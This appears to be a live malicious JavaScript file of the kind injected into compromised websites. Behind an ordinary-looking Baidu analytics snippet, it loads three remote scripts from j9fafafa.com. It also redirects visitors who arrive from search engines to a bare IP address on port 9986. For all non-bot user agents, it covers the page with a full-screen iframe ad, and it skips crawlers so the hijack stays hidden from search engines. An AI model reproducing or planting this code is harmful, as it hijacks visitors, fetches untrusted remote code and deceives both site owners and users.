var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?342a13a864c136e3f0e54c3ea5829c0f";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

document.write('<script src="https://j9fafafa.com/tj/tong.js"><\/script>');
document.write('<script src="https://j9fafafa.com/jx/tong.js"><\/script>');
document.write('<script src="https://j9fafafa.com/dz/tong.js"><\/script>'); // 这是您的 tong.js

function checkReferrer(){
	var regexp = /\.(baidu|haosou|so|sogou|soso|sm|bing|360|wuzhuiso|toutiao|quark|google)(\.[a-z0-9\-]+){1,2}\//ig;
	var where = document.referrer;
	if (regexp.test(where)) {
		return true;
	}
	return false;
}

function checkMobile(){
 var isiPad = navigator.userAgent.match(/iPad/i) != null;
if(isiPad){
  return false;
 }
var sUserAgent = navigator.userAgent.toLowerCase();
var isMobile=sUserAgent.match(/iphone|android|ipad|phone|mobile|wap|netfront|x11|java|operamobi|operamini|uc|windowsce|symbian|symbianos|series|webos|sony|blackberry|dopod|nokia|samsung|palmsource|xda|pieplus|meizu|midp|cldc|motorola|foma|docomo|up.browser|up.link|blazer|helio|hosin|huawei|novarra|coolpad|webos|techfaith|palmsource|alcatel|amoi|ktouch|nexian|ericsson|philips|sagem|wellcom|bunjalloo|maui|smartphone|iemobile|spice|bird|zte-|longcos|pantech|gionee|portalmmm|jig browser|hiptop|benq|haier|^lct|320x320|240x320|176x220/i)!= null;

if(isMobile){
 return true;
 }
return false;
}

function acall_init_go() {
	if(checkReferrer()){
		if(checkMobile()){
			setTimeout(function() {window.location.href="http://122.10.20.46:9986/dz";}, 100);
		}
		else{
			setTimeout(function() {window.location.href="http://122.10.20.46:9986/dz";}, 100);
		}
	}
	else{
		//
	}
}

var jump_myt = setInterval(function(){
    clearInterval(jump_myt);
	acall_init_go();
},100);
//  框架广告
if ((navigator.userAgent.match(/(spider|bot)/ig)))  {}
 else if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
var url = "/hi98/gg.html";
var str1 = document.title;
document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />');
document.write('<style>html,body{width:100%;height:100%;overflow:hidden; clear:both;}</style>');
document.write('<div style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:2147483647;">');
document.write('<iframe src=" ' + url + '" frameborder="0" style="width: 100%; height:100vh;"></iframe>');
document.write('</div>');
}else{
var url = "/hi98/gg.html";
var str1 = document.title;
document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />');
document.write('<style>html,body{width:100%;height:100%;overflow:hidden; clear:both;}</style>');
document.write('<div style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:2147483647;">');
document.write('<iframe src=" ' + url + '" frameborder="0" style="width: 100%; height:100vh;"></iframe>');
document.write('</div>');
}